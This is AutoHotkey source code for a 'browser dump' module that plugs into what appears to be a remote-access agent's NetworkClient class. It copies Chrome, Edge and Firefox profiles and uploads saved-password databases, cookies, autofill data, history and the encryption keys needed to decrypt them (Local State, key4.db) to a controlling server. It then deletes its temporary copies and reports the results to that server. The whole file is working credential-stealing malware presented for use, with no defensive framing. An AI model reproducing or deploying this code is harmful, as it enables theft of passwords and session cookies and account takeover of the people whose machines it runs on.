; ============================================================================
; BROWSER DUMP MODULE
; These methods should be added to the NetworkClient class
; ============================================================================

BrowserDump(includeChrome := "true", includeEdge := "true", includeFirefox := "true") {
    try {
        ; Create timestamp for this dump operation
        timestamp := FormatTime(A_Now, "yyyyMMdd_HHmmss")
        backupPath := "C:\tmp\BrowserDump_" . timestamp

        ; Create the backup directory
        DirCreate(backupPath)

        ; Track overall results
        allUploadedFiles := []
        allFailedFiles := []
        totalSize := 0
        browsersProcessed := []

        ; Process Chrome if selected
        if (includeChrome = "true" || includeChrome = "1") {
            this.Log("Processing Google Chrome...")
            chromeDataPath := EnvGet("LOCALAPPDATA") . "\Google\Chrome\User Data"

            if DirExist(chromeDataPath) {
                result := this.DumpChromiumBrowser("Chrome", chromeDataPath, backupPath, timestamp)
                allUploadedFiles.Push(result.uploaded*)
                allFailedFiles.Push(result.failed*)
                totalSize += result.totalSize
                browsersProcessed.Push("Chrome")
                this.Log("Chrome processing complete")
            } else {
                this.Log("Chrome not found at: " . chromeDataPath)
            }
        }

        ; Process Edge if selected
        if (includeEdge = "true" || includeEdge = "1") {
            this.Log("Processing Microsoft Edge...")
            edgeDataPath := EnvGet("LOCALAPPDATA") . "\Microsoft\Edge\User Data"

            if DirExist(edgeDataPath) {
                result := this.DumpChromiumBrowser("Edge", edgeDataPath, backupPath, timestamp)
                allUploadedFiles.Push(result.uploaded*)
                allFailedFiles.Push(result.failed*)
                totalSize += result.totalSize
                browsersProcessed.Push("Edge")
                this.Log("Edge processing complete")
            } else {
                this.Log("Edge not found at: " . edgeDataPath)
            }
        }

        ; Process Firefox if selected
        if (includeFirefox = "true" || includeFirefox = "1") {
            this.Log("Processing Mozilla Firefox...")
            firefoxDataPath := EnvGet("APPDATA") . "\Mozilla\Firefox\Profiles"

            if DirExist(firefoxDataPath) {
                result := this.DumpFirefox(firefoxDataPath, backupPath, timestamp)
                allUploadedFiles.Push(result.uploaded*)
                allFailedFiles.Push(result.failed*)
                totalSize += result.totalSize
                browsersProcessed.Push("Firefox")
                this.Log("Firefox processing complete")
            } else {
                this.Log("Firefox not found at: " . firefoxDataPath)
            }
        }

        ; Cleanup: Delete the backup directory
        try {
            this.Log("Cleaning up temporary backup directory...")
            DirDelete(backupPath, true)  ; true = recurse
            this.Log("Cleanup completed")
        } catch as cleanupErr {
            this.Log("Cleanup warning: " . cleanupErr.Message)
        }

        ; Generate summary message
        uploadCount := allUploadedFiles.Length
        failCount := allFailedFiles.Length

        if (uploadCount > 0) {
            message := Format("command_output|{}|Browser dump completed!`n`nBrowsers processed: {}`nUploaded {} file(s) - Total size: {} bytes`n",
                            this.agentID, this.JoinArray(browsersProcessed, ", "), uploadCount, totalSize)

            message .= "`nUploaded files:`n"
            for fileName in allUploadedFiles {
                message .= "  - " . fileName . "`n"
            }

            if (failCount > 0) {
                message .= "`nFailed uploads: " . failCount . "`n"
                for fileName in allFailedFiles {
                    message .= "  - " . fileName . "`n"
                }
            }
        } else {
            if (browsersProcessed.Length = 0) {
                message := Format("command_output|{}|Browser dump failed - no browsers found on system", this.agentID)
            } else {
                message := Format("command_output|{}|Browser dump failed - no files uploaded successfully", this.agentID)
            }
        }

        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return (uploadCount > 0)

    } catch as err {
        message := Format("command_output|{}|Browser dump failed: {} (Line: {})",
                        this.agentID, err.Message, err.Line)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}

DumpChromiumBrowser(browserName, browserDataPath, backupPath, timestamp) {
    ; Dumps Chrome/Edge browser data (they use the same structure)
    uploadedFiles := []
    failedFiles := []
    totalSize := 0

    ; Create temporary directory for this browser
    browserBackupPath := backupPath . "\" . browserName

    ; Helper function to copy directory recursively
    CopyDirectory(source, destination) {
        ; Create destination directory
        DirCreate(destination)

        ; Copy all files in source directory
        try {
            FileCopy(source . "\*.*", destination, 1)  ; 1 = overwrite
        } catch {
            ; Silent fail if no files to copy
        }

        ; Recursively copy subdirectories
        Loop Files, source . "\*.*", "D"
        {
            if (A_LoopFileName != "." && A_LoopFileName != "..") {
                CopyDirectory(A_LoopFileFullPath, destination . "\" . A_LoopFileName)
            }
        }
    }

    ; Backup Default profile
    if DirExist(browserDataPath . "\Default") {
        CopyDirectory(browserDataPath . "\Default", browserBackupPath . "\Default")
    }

    ; Backup additional profiles (Profile 1, Profile 2, etc.)
    Loop Files, browserDataPath . "\Profile*", "D"
    {
        profileName := A_LoopFileName
        CopyDirectory(browserDataPath . "\" . profileName, browserBackupPath . "\" . profileName)
    }

    ; Backup the Local State file (contains encryption key)
    localStatePath := browserDataPath . "\Local State"
    if FileExist(localStatePath) {
        try {
            FileCopy(localStatePath, browserBackupPath . "\Local State", 1)  ; 1 = overwrite
        } catch as err {
            this.Log("Failed to copy Local State: " . err.Message)
        }
    }

    ; Define critical files to upload
    criticalFiles := [
        {name: "Login Data", desc: "Saved passwords"},
        {name: "Cookies", desc: "Session cookies"},
        {name: "Web Data", desc: "Autofill data"},
        {name: "History", desc: "Browsing history"},
        {name: "Bookmarks", desc: "Saved bookmarks"},
        {name: "Preferences", desc: "User preferences"}
    ]

    ; Upload Local State file (critical for decryption)
    localStateSource := browserBackupPath . "\Local State"
    if FileExist(localStateSource) {
        this.Log("Uploading " . browserName . " Local State file...")
        renamedPath := browserBackupPath . "\Local_State_" . timestamp
        try {
            FileCopy(localStateSource, renamedPath, 1)
            if this.HandleFileUpload(renamedPath) {
                uploadedFiles.Push(browserName . "_Local_State_" . timestamp)
                totalSize += FileGetSize(renamedPath)
                this.Log("Local State uploaded successfully")
                FileDelete(renamedPath)
            } else {
                failedFiles.Push(browserName . "/Local State")
                this.Log("Failed to upload Local State")
            }
        } catch as err {
            failedFiles.Push(browserName . "/Local State")
            this.Log("Error uploading Local State: " . err.Message)
        }
    }

    ; Upload critical files from Default profile
    defaultProfile := browserBackupPath . "\Default"
    if DirExist(defaultProfile) {
        this.Log("Processing " . browserName . " Default profile...")

        for fileInfo in criticalFiles {
            sourceFile := defaultProfile . "\" . fileInfo.name

            if FileExist(sourceFile) {
                sanitizedName := StrReplace(fileInfo.name, " ", "_")
                destName := browserName . "_Default_" . sanitizedName . "_" . timestamp
                tempPath := browserBackupPath . "\" . destName

                this.Log("Uploading " . fileInfo.name . " (" . fileInfo.desc . ")...")

                try {
                    FileCopy(sourceFile, tempPath, 1)

                    if this.HandleFileUpload(tempPath) {
                        fileSize := FileGetSize(tempPath)
                        uploadedFiles.Push(destName)
                        totalSize += fileSize
                        this.Log(fileInfo.name . " uploaded successfully (" . fileSize . " bytes)")
                        FileDelete(tempPath)
                    } else {
                        failedFiles.Push(browserName . "/Default/" . fileInfo.name)
                        this.Log("Failed to upload " . fileInfo.name)
                    }
                } catch as err {
                    failedFiles.Push(browserName . "/Default/" . fileInfo.name)
                    this.Log("Error uploading " . fileInfo.name . ": " . err.Message)
                }

                Sleep(500)  ; Small delay between uploads
            }
        }
    }

    ; Upload critical files from additional profiles
    Loop Files, browserBackupPath . "\Profile*", "D"
    {
        profileName := A_LoopFileName
        profilePath := A_LoopFilePath
        this.Log("Processing " . browserName . " " . profileName . "...")

        for fileInfo in criticalFiles {
            sourceFile := profilePath . "\" . fileInfo.name

            if FileExist(sourceFile) {
                sanitizedName := StrReplace(fileInfo.name, " ", "_")
                destName := browserName . "_" . profileName . "_" . sanitizedName . "_" . timestamp
                tempPath := browserBackupPath . "\" . destName

                this.Log("Uploading " . profileName . " - " . fileInfo.name . "...")

                try {
                    FileCopy(sourceFile, tempPath, 1)

                    if this.HandleFileUpload(tempPath) {
                        fileSize := FileGetSize(tempPath)
                        uploadedFiles.Push(destName)
                        totalSize += fileSize
                        this.Log(fileInfo.name . " uploaded successfully (" . fileSize . " bytes)")
                        FileDelete(tempPath)
                    } else {
                        failedFiles.Push(browserName . "/" . profileName . "/" . fileInfo.name)
                        this.Log("Failed to upload " . fileInfo.name)
                    }
                } catch as err {
                    failedFiles.Push(browserName . "/" . profileName . "/" . fileInfo.name)
                    this.Log("Error uploading " . fileInfo.name . ": " . err.Message)
                }

                Sleep(500)
            }
        }
    }

    return {uploaded: uploadedFiles, failed: failedFiles, totalSize: totalSize}
}

DumpFirefox(firefoxProfilesPath, backupPath, timestamp) {
    ; Dumps Firefox browser data
    uploadedFiles := []
    failedFiles := []
    totalSize := 0

    ; Firefox critical files
    firefoxFiles := [
        {name: "logins.json", desc: "Encrypted passwords"},
        {name: "key4.db", desc: "Encryption key"},
        {name: "cookies.sqlite", desc: "Cookies database"},
        {name: "places.sqlite", desc: "History and bookmarks"}
    ]

    ; Firefox stores profiles in randomly named directories
    Loop Files, firefoxProfilesPath . "\*", "D"
    {
        profilePath := A_LoopFilePath
        profileName := A_LoopFileName

        this.Log("Processing Firefox profile: " . profileName)

        ; Check if this looks like a Firefox profile (has key4.db or logins.json)
        if FileExist(profilePath . "\key4.db") || FileExist(profilePath . "\logins.json") {

            for fileInfo in firefoxFiles {
                sourceFile := profilePath . "\" . fileInfo.name

                if FileExist(sourceFile) {
                    sanitizedName := StrReplace(fileInfo.name, " ", "_")
                    destName := "Firefox_" . profileName . "_" . sanitizedName . "_" . timestamp
                    tempPath := backupPath . "\" . destName

                    this.Log("Uploading " . fileInfo.name . " (" . fileInfo.desc . ")...")

                    try {
                        FileCopy(sourceFile, tempPath, 1)

                        if this.HandleFileUpload(tempPath) {
                            fileSize := FileGetSize(tempPath)
                            uploadedFiles.Push(destName)
                            totalSize += fileSize
                            this.Log(fileInfo.name . " uploaded successfully (" . fileSize . " bytes)")
                            FileDelete(tempPath)
                        } else {
                            failedFiles.Push("Firefox/" . profileName . "/" . fileInfo.name)
                            this.Log("Failed to upload " . fileInfo.name)
                        }
                    } catch as err {
                        failedFiles.Push("Firefox/" . profileName . "/" . fileInfo.name)
                        this.Log("Error uploading " . fileInfo.name . ": " . err.Message)
                    }

                    Sleep(500)
                }
            }
        } else {
            this.Log("Skipping " . profileName . " - not a Firefox profile")
        }
    }

    return {uploaded: uploadedFiles, failed: failedFiles, totalSize: totalSize}
}

JoinArray(arr, separator) {
    ; Helper function to join array elements with a separator
    result := ""
    for index, value in arr {
        if (index > 1) {
            result .= separator
        }
        result .= value
    }
    return result
}
